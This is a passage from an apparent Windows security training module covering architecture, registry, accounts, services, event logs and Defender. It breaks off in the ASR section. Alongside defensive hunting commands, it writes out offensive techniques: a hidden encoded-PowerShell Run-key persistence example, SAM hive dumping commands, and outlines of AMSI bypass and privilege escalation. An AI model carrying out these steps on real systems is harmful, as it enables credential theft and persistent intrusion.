# Stage 0.3 — Windows Fundamentals
### From Zero to Cybersecurity Professional | Complete Roadmap Series

> **Series:** Cybersecurity × OT/ICS Security — Full Roadmap  
> **Stage:** 0 — Computer Science Foundations  
> **Module:** 0.3 — Windows Fundamentals  
> **Level:** Beginner → Intermediate  
> **Prerequisites:** Stage 0.2 — Operating System Fundamentals  
> **Next Module:** 0.4 — Linux Fundamentals

---

## Table of Contents

1. [Why Windows Mastery Is Non-Negotiable](#1-why-windows-mastery-is-non-negotiable)
2. [Windows Architecture](#2-windows-architecture)
3. [Registry Structure](#3-registry-structure)
4. [User and Group Management](#4-user-and-group-management)
5. [Windows Service Architecture](#5-windows-service-architecture)
6. [Task Manager, Event Viewer, msconfig](#6-task-manager-event-viewer-msconfig)
7. [Windows Defender](#7-windows-defender)
8. [UAC — User Account Control](#8-uac--user-account-control)
9. [Windows Firewall](#9-windows-firewall)
10. [PowerShell Fundamentals](#10-powershell-fundamentals)
11. [CMD — Core Commands](#11-cmd--core-commands)
12. [Task Scheduler](#12-task-scheduler)
13. [Windows Update Mechanism](#13-windows-update-mechanism)
14. [Key Takeaways and Security Mindset](#14-key-takeaways-and-security-mindset)
15. [Hands-On Exercises](#15-hands-on-exercises)
16. [Further Reading and Resources](#16-further-reading-and-resources)

---

## 1. Why Windows Mastery Is Non-Negotiable

Windows runs on approximately **72% of all desktop computers worldwide**. More critically for your career, the overwhelming majority of enterprise environments — corporations, hospitals, government agencies, banks, industrial facilities — run Windows-based infrastructure. Active Directory, which dominates enterprise identity management globally, is a Windows technology. Most SCADA HMI software (Wonderware, FactoryTalk, WinCC) runs on Windows. Most endpoint detection products are built primarily around Windows behaviour.

This means:

- **As a penetration tester**, most of your targets will be Windows systems. Post-exploitation on Windows — lateral movement, credential harvesting, persistence — is a distinct skillset that requires deep OS knowledge.
- **As a SOC analyst**, most of your alerts will be about Windows events. Understanding what normal Windows behaviour looks like is the only way to recognise abnormal behaviour.
- **As a blue teamer**, hardening Windows, configuring Defender, writing detection rules for Event Log events — these are daily tasks.
- **For OT/ICS work**, most HMI workstations and SCADA servers run Windows. Legacy versions (Windows XP, Windows 7) are still extremely common in industrial environments and have vastly different security profiles than modern Windows.

The security mindset for this module: **Windows is not just a target — it is an ecosystem. Attackers live inside its own mechanisms. They use legitimate Windows tools to attack Windows systems. Your job is to know those mechanisms better than the attacker does.**

---

## 2. Windows Architecture

### 2.1 The Big Picture

Windows NT (the architecture underlying all modern Windows versions from NT 3.1 through Windows 11 and Windows Server 2022) is a hybrid kernel architecture. We covered the theory in Stage 0.2 — here we map it to concrete Windows components.

```
┌──────────────────────────────────────────────────────────────┐
│                     USER MODE                                │
│                                                              │
│  ┌────────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │  Win32 Apps    │  │ .NET Apps    │  │  UWP / Store    │  │
│  │  (notepad.exe) │  │  (C# code)   │  │  Apps           │  │
│  └───────┬────────┘  └──────┬───────┘  └────────┬────────┘  │
│          │                  │                   │            │
│  ┌───────▼──────────────────▼───────────────────▼────────┐  │
│  │              Subsystem DLLs                            │  │
│  │   kernel32.dll  advapi32.dll  user32.dll  ntdll.dll    │  │
│  └───────────────────────────┬────────────────────────────┘  │
│                              │  System Call Interface         │
├──────────────────────────────┼──────────────────────────────-┤
│                     KERNEL MODE                              │
│                              │                               │
│  ┌───────────────────────────▼────────────────────────────┐  │
│  │              Executive (ntoskrnl.exe)                  │  │
│  │  ┌───────────┐ ┌──────────┐ ┌──────────┐ ┌─────────┐  │  │
│  │  │ Process & │ │ Memory   │ │ I/O      │ │Security │  │  │
│  │  │ Thread Mgr│ │ Manager  │ │ Manager  │ │Reference│  │  │
│  │  ├───────────┤ ├──────────┤ ├──────────┤ │Monitor  │  │  │
│  │  │ Object    │ │ Cache    │ │ Plug&Play│ └─────────┘  │  │
│  │  │ Manager   │ │ Manager  │ │ Manager  │              │  │
│  │  └───────────┘ └──────────┘ └──────────┘              │  │
│  ├────────────────────────────────────────────────────────┤  │
│  │              Kernel (Dispatcher, Interrupts)            │  │
│  ├────────────────────────────────────────────────────────┤  │
│  │              HAL — Hardware Abstraction Layer           │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐    │
│  │         Kernel-Mode Drivers (win32k.sys, etc.)        │    │
│  └──────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────┘
│                     HARDWARE                                 │
└──────────────────────────────────────────────────────────────┘
```

### 2.2 Key Architectural Components

#### ntoskrnl.exe — The Windows Kernel

`ntoskrnl.exe` (NT OS Kernel) is the core kernel binary. It is always loaded into kernel space and never unloaded while the system is running. It implements:

- **Executive** — high-level OS services (process management, memory management, I/O)
- **Kernel** — low-level primitives (thread scheduling, interrupt handling, synchronisation)
- **HAL interface** — communicates with the Hardware Abstraction Layer

```powershell
# Verify ntoskrnl.exe is running
Get-Process | Where-Object {$_.Name -eq "System"}
# The "System" process (PID 4) is the kernel process
```

#### ntdll.dll — The Bridge Between Worlds

`ntdll.dll` is the lowest-level user-mode DLL. Every process loads it. It contains:
- The stubs for all Windows system calls (the actual `syscall` instructions)
- The Windows loader
- Core runtime functions used by all other DLLs

**Security Significance:** Every modern EDR product hooks functions inside `ntdll.dll` to monitor behaviour. When your code calls `CreateFile()`, it goes through `kernel32.dll` → `ntdll.dll` → kernel. The EDR's hook in `ntdll.dll` intercepts this call before it reaches the kernel. This is precisely why **direct syscall** techniques (covered in Stage 0.2) that bypass `ntdll.dll` entirely are so popular in offensive tooling.

#### csrss.exe — Client-Server Runtime Process

The Client/Server Runtime Subsystem. Handles Win32 console windows and process/thread creation notifications. **Critical system process** — terminating it causes a Blue Screen of Death. Malware that names itself `csrss.exe` or `cssrs.exe` is attempting to blend in with this legitimate process name.

```powershell
# There should be exactly one or two csrss.exe instances
# (one per active session — Session 0 for services, Session 1+ for users)
Get-Process csrss | Select-Object Id, SessionId, Path
# CRITICAL: csrss.exe must always run from C:\Windows\System32\
# Any csrss.exe running from another path is malware
```

#### lsass.exe — The Credential Store

LSASS (Local Security Authority Subsystem Service) is one of the most targeted processes on any Windows system. It:
- Handles all authentication (local, domain, network)
- Stores credentials in memory (NTLM hashes, Kerberos tickets, plaintext in older configs)
- Enforces security policy

**Why attackers love lsass.exe:**
Tools like **Mimikatz** dump credential material directly from lsass.exe's memory. Credential access is Step 5 in almost every real-world Windows intrusion. Microsoft has progressively hardened lsass — Protected Process Light (PPL), Credential Guard, LSASS memory protection — but the target remains the same.

```powershell
# lsass.exe must always run from System32, owned by SYSTEM, one instance
Get-Process lsass | Select-Object Id, Path, StartTime
# Any lsass.exe not in System32 is an immediate incident
```

#### winlogon.exe — Session Management

Handles the secure desktop (Ctrl+Alt+Delete), user logon/logoff, and loads the user profile. It loads the Logon UI and calls LSASS to authenticate credentials.

**Security note:** The **Sticky Keys bypass** is a classic persistence technique that replaces `sethc.exe` (Sticky Keys) or `utilman.exe` (Ease of Access) with `cmd.exe`. Since these are launched by `winlogon.exe` before authentication, the result is a SYSTEM command prompt on the login screen — no credentials required.

### 2.3 The Windows Session Model

Windows separates kernel activities from user sessions:

```
Session 0 — Services and System Processes
    svchost.exe (services)
    lsass.exe
    csrss.exe
    wininit.exe

Session 1 — First Interactive User
    explorer.exe
    your applications
    csrss.exe (own instance)

Session 2 — Second Interactive User (RDP, etc.)
    explorer.exe
    ...
```

Session 0 isolation (introduced in Windows Vista) prevents user applications from interacting with service windows. Before Vista, attackers could send window messages to SYSTEM-privilege service windows to execute arbitrary code — "shatter attacks." Session isolation eliminated this attack class.

### 2.4 The WOW64 Subsystem

On 64-bit Windows, 32-bit applications run inside the **WOW64 (Windows-on-Windows 64-bit)** subsystem. This is important for security because:

- 32-bit processes use a different system call path than 64-bit processes.
- Security software that only monitors 64-bit system calls can be bypassed by malware running as a 32-bit process using `Heaven's Gate` — a technique that switches from 32-bit to 64-bit mode to issue native 64-bit system calls directly, bypassing 32-bit hooks.
- Some protections (CFG, CET) behave differently for 32-bit processes.

---

## 3. Registry Structure

### 3.1 What Is the Windows Registry

The Windows Registry is a hierarchical database that stores configuration information for the operating system, hardware, installed software, and user preferences. It is the central nervous system of Windows configuration.

Everything from your desktop wallpaper to auto-start programs to USB device history to recently opened files is stored in the registry. For a security professional, the registry is both an attack surface and an evidence source of extraordinary richness.

### 3.2 Registry Structure

The registry is organised into a tree of keys and values, similar to a file system:

```
Registry Root (Hives)
├── HKEY_LOCAL_MACHINE (HKLM)      — System-wide settings
│   ├── SOFTWARE                   — Installed software config
│   ├── SYSTEM                     — Hardware and driver config
│   │   └── CurrentControlSet
│   │       ├── Services           — Service configuration
│   │       └── Control
│   ├── SECURITY                   — Security policy (restricted)
│   └── SAM                        — Local account database (restricted)
│
├── HKEY_CURRENT_USER (HKCU)       — Current user's settings
│   ├── Software                   — Per-user software settings
│   ├── Environment                — User environment variables
│   └── ...
│
├── HKEY_USERS (HKU)               — All users' profiles
│   ├── .DEFAULT                   — Default profile
│   ├── S-1-5-18                   — SYSTEM account
│   ├── S-1-5-19                   — LOCAL SERVICE
│   ├── S-1-5-20                   — NETWORK SERVICE
│   └── S-1-5-21-...-1001          — User SID → their HKCU
│
├── HKEY_CLASSES_ROOT (HKCR)       — File associations, COM objects
└── HKEY_CURRENT_CONFIG (HKCC)     — Current hardware profile
```

### 3.3 Registry Value Types

| Type | Name | Description | Example |
|------|------|-------------|---------|
| `REG_SZ` | String | Plain text | `C:\Windows\System32\cmd.exe` |
| `REG_EXPAND_SZ` | Expandable String | String with env vars | `%SystemRoot%\System32\cmd.exe` |
| `REG_DWORD` | 32-bit Integer | Number | `1` (enabled/disabled flags) |
| `REG_QWORD` | 64-bit Integer | Large number | Timestamps |
| `REG_BINARY` | Binary | Raw binary data | Hardware settings |
| `REG_MULTI_SZ` | Multi-String | List of strings | Service dependencies |

### 3.4 Critical Registry Locations for Security

These are the locations every security professional must know. Memorise them.

#### Persistence — AutoRun Keys

The most important persistence locations. Malware, legitimate software, and scheduled tasks all use these to survive reboots.

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 64-bit OS, 32-bit app compatibility keys:
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

```powershell
# Check all autorun locations
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Better: use Autoruns from Sysinternals — shows EVERYTHING
# https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
```

> **Security Note:** Autoruns from Sysinternals is arguably the most important single tool for Windows malware analysis and persistence hunting. It shows every autostart location in the registry, file system, and scheduled tasks — and can compare the current state against VirusTotal. Run it on any suspected compromised system immediately.

#### Service Configuration

```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
    └── ImagePath    → Path to the service executable
    └── Start        → 0=Boot, 1=System, 2=Auto, 3=Manual, 4=Disabled
    └── Type         → Service type
    └── ObjectName   → Account the service runs as
```

> **Privilege Escalation:** If the `ImagePath` value of a service running as SYSTEM points to a binary that a low-privilege user can modify or replace, the attacker replaces the binary with a malicious one. The next time the service starts, their code runs as SYSTEM. This is one of the most common Windows privilege escalation paths.

#### SAM — The Local Password Database

```
HKLM\SAM\SAM\Domains\Account\Users
```

The SAM (Security Account Manager) hive stores local user account information including NTLM password hashes. The SAM hive is locked and inaccessible while Windows is running — even to SYSTEM. However, attackers use several techniques to access it:

- **Volume Shadow Copy:** `vssadmin create shadow /for=C:` then copy the shadow's SAM file
- **reg save:** `reg save HKLM\SAM sam.hive` (requires SYSTEM privileges)
- **Mimikatz:** `lsadump::sam` — reads from the locked hive using the kernel driver

#### SYSTEM Hive — Boot Key

```
HKLM\SYSTEM\CurrentControlSet\Control\LSA\JD
HKLM\SYSTEM\CurrentControlSet\Control\LSA\Skew1
HKLM\SYSTEM\CurrentControlSet\Control\LSA\GBG
HKLM\SYSTEM\CurrentControlSet\Control\LSA\Data
```

These four subkeys together form the SYSKEY (boot key) used to encrypt the SAM database. To decrypt SAM hashes, both the SAM hive AND the SYSTEM hive are required. This is why credential extraction tools always dump both.

#### UserAssist — Execution History

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
```

Tracks programs executed by the user, encoded in ROT-13. Forensically valuable — shows what programs the user ran and when, even if those programs have since been deleted.

#### RecentDocs and TypedPaths

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
```

Recently accessed files and manually typed Explorer paths. Forensic gold for understanding what a user accessed.

#### ShimCache (AppCompatCache)

```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache
```

The Application Compatibility Cache records every executable that ran on the system (file path, size, last modified time). **Critically, it records execution history even for files that have since been deleted.** This is one of the most important forensic artefacts in Windows investigations — it can prove a malicious binary ran on the system even after the file was cleaned up.

#### AmCache

```
C:\Windows\AppCompat\Programs\Amcache.hve  (separate hive file, not inline)
```

Similar to ShimCache but stores SHA1 hashes of executed files. Even if the malware is gone, its hash remains and can be submitted to VirusTotal for attribution.

#### NTUSER.DAT — The User Hive

Each user's `HKCU` is backed by a file:
```
C:\Users\<username>\NTUSER.DAT
```

This is a complete registry hive file. Forensic tools like **Registry Explorer** (Eric Zimmermann) and **regripper** parse offline hive files — essential for dead-box analysis when you cannot boot the system.

### 3.5 Registry as an Attack Surface

**Fileless Malware and the Registry:**
Malware increasingly stores its payload directly in the registry rather than on disk, specifically to evade file-based antivirus scanning:

```powershell
# Attacker stores Base64-encoded payload in registry
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "Updater" `
    -Value "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>"
```

The payload never touches disk as a file — it lives in the registry and is executed by PowerShell. Many legacy antivirus products never detect this because they only scan files.

**Registry Hive Injection:**
Advanced attackers can inject malicious DLLs through COM object hijacking:

```
# If this key exists for a COM object:
HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32 = C:\malware.dll

# And a legitimate application loads this COM object,
# the malicious DLL is loaded into that application's process
# WITHOUT creating any autorun key or scheduled task
```

---

## 4. User and Group Management

### 4.1 Windows Accounts

Windows has two fundamentally different account types:

**Local Accounts** — Exist only on the specific machine. Stored in the SAM database.

**Domain Accounts** — Exist in Active Directory, can authenticate to any machine in the domain. Covered in depth in Stage 7.

**Built-in Accounts You Must Know:**

| Account | SID | Description | Security Significance |
|---------|-----|-------------|----------------------|
| **Administrator** | S-1-5-21-...-500 | Built-in local admin | RID 500 — cannot be deleted, can be renamed |
| **Guest** | S-1-5-21-...-501 | Low privilege guest | Disabled by default, should stay disabled |
| **SYSTEM** | S-1-5-18 | OS itself | Highest privilege on local machine |
| **LOCAL SERVICE** | S-1-5-19 | Limited service account | Minimal privileges, no network credentials |
| **NETWORK SERVICE** | S-1-5-20 | Network service account | Like LOCAL SERVICE but uses computer credentials on network |

**The RID 500 Administrator:**
The built-in Administrator account always has RID (Relative Identifier) 500. Even if renamed to "notadmin" or "helpdesk," its SID ends in -500. Security tools identify it by SID, not name. This account is disabled by default on modern Windows, but enabling it is a common attacker persistence technique because it cannot be deleted.

### 4.2 Security Identifiers (SIDs)

Every user, group, and computer in Windows has a unique **SID (Security Identifier)**. SIDs are the actual identity — names are just human-readable labels.

```
S-1-5-21-3623811015-3361044348-30300820-1013
│ │ │    └────────────────────────────────── RID (Relative ID - 1013 = user)
│ │ └─────────────────────────────────────── Domain/Machine identifier
│ └───────────────────────────────────────── NT Authority (5)
└─────────────────────────────────────────── SID revision (1)
```

**Well-known SIDs:**
```
S-1-1-0          Everyone
S-1-5-18         SYSTEM
S-1-5-32-544     BUILTIN\Administrators
S-1-5-32-545     BUILTIN\Users
S-1-5-32-546     BUILTIN\Guests
```

```powershell
# Get current user's SID
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

# Get SID for any user
Get-LocalUser -Name "Administrator" | Select-Object Name, SID

# Convert SID to name
$objSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-...")
$objSID.Translate([System.Security.Principal.NTAccount])
```

### 4.3 Local Groups

```powershell
# List all local groups
Get-LocalGroup

# Key groups:
# Administrators  — Members can do anything on the local machine
# Users           — Standard users
# Remote Desktop Users — Can connect via RDP
# Remote Management Users — Can connect via WinRM/PowerShell remoting
# Backup Operators — Can bypass file permissions for backup (dangerous if abused)
# Event Log Readers — Can read event logs without admin rights

# Check members of Administrators group
Get-LocalGroupMember -Group "Administrators"

# This is a critical check during post-exploitation:
# Who else has admin on this machine?
```

**Backup Operators — An Often Overlooked Privilege:**
Members of the Backup Operators group have `SeBackupPrivilege` and `SeRestorePrivilege`. These allow reading any file regardless of NTFS permissions (for "backup" purposes). An attacker with Backup Operators membership can:
1. Copy the SAM and SYSTEM hives using backup APIs
2. Extract password hashes
3. Crack or pass them for lateral movement

This is exactly why group membership matters — it is not just about "Administrator" vs "User."

### 4.4 Access Tokens and Impersonation

When a user logs in, Windows creates an **access token** — a data structure containing:
- User SID
- Group SIDs (all groups the user belongs to)
- Privileges
- Integrity level
- Session ID

Every process and thread has an access token. All access control checks compare the token against the object's ACL.

**Token Impersonation — The Post-Exploitation Technique:**
Windows allows processes (with the right privileges) to "impersonate" another user by duplicating their token. This is a critical lateral movement and privilege escalation technique:

```
Scenario:
1. Attacker compromises a web server running as IIS AppPool
2. A domain admin connects to the server and their token is cached
3. With SeImpersonatePrivilege (which IIS workers have by default),
   the attacker duplicates the domain admin's token
4. Attacker creates a new process with the impersonated token
5. Now running as domain admin
```

Tools like **Incognito** (Metasploit module) and **Juicy Potato** / **Rotten Potato** / **Sweet Potato** automate token impersonation attacks. These are extremely common in CTF post-exploitation and real penetration tests.

```powershell
# Check current token privileges
whoami /priv

# Dangerous privileges that enable privilege escalation:
# SeImpersonatePrivilege  → Potato attacks, token impersonation
# SeAssignPrimaryToken    → Assign tokens to new processes
# SeBackupPrivilege       → Read any file
# SeRestorePrivilege      → Write any file
# SeDebugPrivilege        → Debug (and inject into) any process including SYSTEM ones
# SeLoadDriverPrivilege   → Load kernel drivers → BYOVD attacks
# SeTakeOwnershipPrivilege → Take ownership of any object
```

---

## 5. Windows Service Architecture

### 5.1 What Is a Windows Service

A Windows service is a long-running executable that performs specific functions and can be started automatically at boot, independently of user login. Services run in the background with no user interface.

Services are the backbone of Windows functionality:
- `wuauserv` — Windows Update
- `WinDefend` — Windows Defender
- `LanmanServer` — File sharing (SMB server)
- `TermService` — Remote Desktop
- `Dnscache` — DNS client cache
- `EventLog` — Windows Event Log

### 5.2 Service Internals

```powershell
# List all services with details
Get-Service | Select-Object Name, DisplayName, Status, StartType

# Get detailed service configuration
Get-WmiObject Win32_Service | 
    Select-Object Name, PathName, StartMode, State, StartName |
    Where-Object {$_.State -eq "Running"} |
    Sort-Object Name

# The StartName field is critical — it shows what account the service runs as
# Values you'll see: LocalSystem, NT AUTHORITY\LocalService, NT AUTHORITY\NetworkService,
# NT AUTHORITY\SYSTEM, or a specific domain/local account
```

### 5.3 svchost.exe — The Service Host

`svchost.exe` (Service Host) is a generic host process for Windows services that are implemented as DLLs rather than standalone executables. Many services share svchost.exe instances to save resources.

This is one of the most abused process names in malware. Understanding normal svchost.exe behaviour is essential:

```powershell
# List all svchost instances and what services they host
Get-Process svchost | ForEach-Object {
    $pid = $_.Id
    $services = Get-WmiObject Win32_Service | Where-Object {$_.ProcessId -eq $pid}
    [PSCustomObject]@{
        PID = $pid
        Services = ($services.Name -join ", ")
        Path = $_.Path
    }
} | Format-Table -Wrap

# CRITICAL CHECKS for each svchost.exe:
# 1. Must run from C:\Windows\System32\svchost.exe
# 2. Must be spawned by services.exe
# 3. Must have -k <group_name> parameter
# Any svchost.exe that fails these checks is suspicious
```

**Process Hollowing with svchost.exe:**
Attackers commonly create a legitimate svchost.exe process in suspended state, then replace its memory contents with malicious code before resuming it. This results in malicious code running inside what appears to be a legitimate system process. Modern EDR products detect this by monitoring for process creation followed by memory writes from an external process.

### 5.4 Service Permissions — The Privilege Escalation Surface

Services that run as SYSTEM but have insecure permissions are a primary Windows privilege escalation vector:

**Unquoted Service Path:**
If a service's `ImagePath` contains spaces and is not quoted, Windows searches for the executable in multiple locations:

```
Unquoted path: C:\Program Files\Vulnerable Service\service.exe

Windows searches in order:
1. C:\Program.exe          ← If this exists, it runs as SYSTEM!
2. C:\Program Files\Vulnerable.exe
3. C:\Program Files\Vulnerable Service\service.exe
```

If an attacker can write to `C:\` (often possible for non-admin users), they place a malicious `Program.exe` there. Next service restart = SYSTEM shell.

```powershell
# Find unquoted service paths
Get-WmiObject Win32_Service | 
    Where-Object {$_.PathName -notmatch '^"' -and $_.PathName -match ' '} |
    Select-Object Name, PathName, StartMode, StartName
```

**Weak Service Binary Permissions:**
```powershell
# Find services where users can modify the binary
Get-WmiObject Win32_Service | ForEach-Object {
    $path = ($_.PathName -split '"')[1]
    if (!$path) { $path = ($_.PathName -split ' ')[0] }
    if ($path -and (Test-Path $path)) {
        $acl = Get-Acl $path
        $acl.Access | Where-Object {
            $_.IdentityReference -match "Everyone|BUILTIN\\Users|BUILTIN\\Authenticated" -and
            $_.FileSystemRights -match "Write|Modify|FullControl"
        } | ForEach-Object {
            "$($_.name): $path writable by $($_.IdentityReference)"
        }
    }
}
```

---

## 6. Task Manager, Event Viewer, msconfig

### 6.1 Task Manager — Beyond Ctrl+Alt+Delete

Task Manager (`taskmgr.exe`) is the most accessible process monitoring tool. But most users use only 10% of its capability.

**Processes Tab — What to Look For:**

```powershell
# Command line equivalent with more detail:
Get-Process | Select-Object Name, Id, CPU, WorkingSet, 
    @{N='ParentPID';E={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").ParentProcessId}},
    Path | Sort-Object CPU -Descending
```

**Key columns to enable** (right-click column headers):
- **PID** — Always enable this
- **Publisher** — Is this binary signed by Microsoft or a known vendor?
- **Command Line** — Reveals arguments passed to the process
- **CPU Time** — Cumulative, not just current usage

**Details Tab — The Real Information:**
The Details tab shows all processes including those not tied to a user session. Enable columns: PID, Session, CPU, Memory, Description, Image Path, Command Line.

**What anomalies look like in Task Manager:**
- `svchost.exe` running from anything other than `C:\Windows\System32\`
- `explorer.exe` running with an unusual parent (should be `userinit.exe`)
- Multiple instances of processes that should be unique (`lsass.exe`, `winlogon.exe`)
- Processes with no description or publisher (legitimate Microsoft processes always have these)
- Processes consuming high CPU with no obvious reason

### 6.2 Event Viewer — The Security Audit Trail

Event Viewer (`eventvwr.msc`) is where Windows records everything. For security professionals, it is the primary forensic record.

**Event Log Structure:**
```
Windows Logs:
├── Application    — Application errors and information
├── Security       — Authentication, authorisation, policy changes
├── Setup          — Windows installation events
├── System         — OS component events
└── Forwarded Events — Aggregated from other machines

Applications and Services Logs:
├── Microsoft\Windows\PowerShell\Operational  ← Critical for threat hunting
├── Microsoft\Windows\Sysmon\Operational      ← Best Windows telemetry (if installed)
├── Microsoft\Windows\TaskScheduler\Operational
├── Microsoft\Windows\WMI-Activity\Operational
└── ... hundreds more
```

**Critical Security Event IDs — Memorise These:**

| Event ID | Log | Description | Why It Matters |
|----------|-----|-------------|----------------|
| **4624** | Security | Successful logon | Who logged in, from where, with what method |
| **4625** | Security | Failed logon | Brute force attempts, invalid credentials |
| **4648** | Security | Logon with explicit credentials | Pass-the-Hash, RunAs, credential-based lateral movement |
| **4634/4647** | Security | Logoff | Session duration |
| **4672** | Security | Special privileges assigned to new logon | Admin-equivalent logon |
| **4688** | Security | New process created | Process execution audit (requires policy change) |
| **4689** | Security | Process terminated | |
| **4698** | Security | Scheduled task created | Common persistence mechanism |
| **4699** | Security | Scheduled task deleted | Covering tracks |
| **4702** | Security | Scheduled task updated | Modifying persistence |
| **4720** | Security | User account created | New account creation |
| **4722** | Security | User account enabled | Enabling disabled accounts |
| **4723/4724** | Security | Password change/reset | Credential changes |
| **4728/4732/4756** | Security | User added to security group | Privilege escalation via group membership |
| **4756** | Security | Member added to universal group | |
| **4768** | Security | Kerberos TGT requested | Authentication events |
| **4769** | Security | Kerberos service ticket requested | Kerberoasting detection |
| **4771** | Security | Kerberos pre-auth failed | |
| **4776** | Security | NTLM authentication | Pass-the-Hash detection |
| **7045** | System | New service installed | Malware installing as service |
| **1102** | Security | Audit log cleared | Attacker covering tracks — IMMEDIATE ALERT |

```powershell
# Query specific event IDs
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4624, 4625
    StartTime = (Get-Date).AddDays(-1)
} | Select-Object TimeCreated, Id, Message | Format-List

# Find all failed logons in last 24 hours
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddDays(-1)} |
    ForEach-Object {
        $xml = [xml]$_.ToXml()
        [PSCustomObject]@{
            Time = $_.TimeCreated
            TargetUser = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
            WorkstationName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'WorkstationName'} | Select-Object -ExpandProperty '#text'
            IpAddress = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
        }
    }

# Check if audit log was cleared (immediate red flag)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} |
    Select-Object TimeCreated, Message
```

**Logon Types — Critical for Understanding Authentication Events:**

| Type | Name | Description | Security Context |
|------|------|-------------|-----------------|
| 2 | Interactive | Physical or console logon | Normal user login |
| 3 | Network | SMB, named pipes | Lateral movement, file shares |
| 4 | Batch | Scheduled tasks | Persistence mechanisms |
| 5 | Service | Service startup | Service account activity |
| 7 | Unlock | Workstation unlock | |
| 8 | NetworkCleartext | Cleartext credentials over network | IIS basic auth, legacy |
| 9 | NewCredentials | RunAs with /netonly | Pass-the-Hash, impersonation |
| 10 | RemoteInteractive | RDP | Remote access |
| 11 | CachedInteractive | Cached domain credentials | Offline domain logon |

> **Analyst Note:** Logon Type 3 (Network) events are the backbone of lateral movement detection. When an attacker moves from machine to machine using Pass-the-Hash or stolen credentials, each authentication generates a Type 3 logon event. Correlating Type 3 events across machines reveals the attacker's path through the network.

### 6.3 msconfig — System Configuration

`msconfig.exe` (System Configuration) is a GUI tool for managing startup items, services, and boot options. Primarily useful for:

- **Boot tab** — Safe mode options, boot logging, enabling boot debugging (useful for kernel analysis)
- **Services tab** — Enable/disable services at startup
- **Startup tab** — Legacy startup item management (modern Windows redirects this to Task Manager)

**Security Relevance:**
`msconfig` is less relevant for security work than Autoruns (which shows far more locations) but understanding it is important because:
- Attackers sometimes disable security services through msconfig
- Malware occasionally adds boot configuration changes
- "Safe boot" mode is used during malware removal to prevent malware from loading

---

## 7. Windows Defender

### 7.1 Windows Defender Architecture

Windows Defender (officially **Microsoft Defender Antivirus**) is a full-featured security suite built into Windows. It has evolved dramatically — from a basic antispyware tool in Windows Vista to a competitive enterprise-grade security product.

**Key Components:**

```
Windows Security (GUI)
    ↓
Microsoft Defender Antivirus Service (WinDefend)
    ├── Real-time Protection Engine
    │   ├── IOAV (I/O Access Validation) — scans files on access
    │   ├── Behaviour Monitoring — watches process behaviour
    │   └── Network Inspection System (NIS)
    ├── Signature-based Detection
    │   └── VDM files (definition updates)
    ├── Cloud-based Protection (MAPS)
    │   └── Submits suspicious files to Microsoft for analysis
    ├── Controlled Folder Access — ransomware protection
    └── Attack Surface Reduction (ASR) Rules
```

**AMSI — Anti-Malware Scan Interface:**
This is one of the most important Windows security features for understanding the cat-and-mouse game between attackers and defenders.

AMSI provides a standardised interface that security products (Defender and third-party) can hook into to scan **script content at runtime** — PowerShell scripts, VBScript, JavaScript, and other interpreted languages — before execution.

```
PowerShell script execution path:
Script content → AMSI Provider (Defender) → Scan → Malicious? Block : Execute
```

Before AMSI, attackers could simply base64-encode a PowerShell payload and antivirus could not see it because it only scanned the file, not the decoded script content. AMSI scans the decoded, in-memory content.

**AMSI Bypass Techniques (for understanding, not abuse):**
Attackers have developed numerous AMSI bypass techniques, making this an ongoing arms race:

```powershell
# AMSI works by scanning content via AmsiScanBuffer() in amsi.dll
# Bypass approach 1 (patched, historical): Patch the return value
# Bypass approach 2: Reflection to set amsiInitFailed = true
# Bypass approach 3: Obfuscation to avoid signature patterns
# Bypass approach 4: Use .NET assemblies loaded in a way that doesn't invoke AMSI

# Defenders detect AMSI bypass attempts via:
# - PowerShell script block logging (Event ID 4104)
# - Memory patching of amsi.dll
# - Behavioural indicators of common bypass patterns
```

Understanding AMSI is directly relevant to both offensive (bypassing it during a pentest) and defensive (detecting bypass attempts via Event Viewer) work.

### 7.2 Attack Surface Reduction (ASR) Rules

ASR rules are one of the most underutilised but powerful features of modern Defender. They block specific attack techniques at the policy level:

| Rule | What It Blocks |
|------|---------------|
| Block Office apps from creating child processes | `winword.exe` spawning `cmd.exe` — classic maldoc technique |
| Block Office macros from Win32 API calls | Macro-based malware calling Windows APIs directly |
| Block credential stealing from LSASS | Mimikatz-style attacks against LSASS |
| Block process creation from PSExec and WMI | Lateral movement via PSExec/WMI |
| Block untrusted/unsigned executables from USB | USB-delivered malware |
| Block JavaScript/VBScript launching executables | Script-based downloaders |

```powershell
# Check current ASR rules status
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
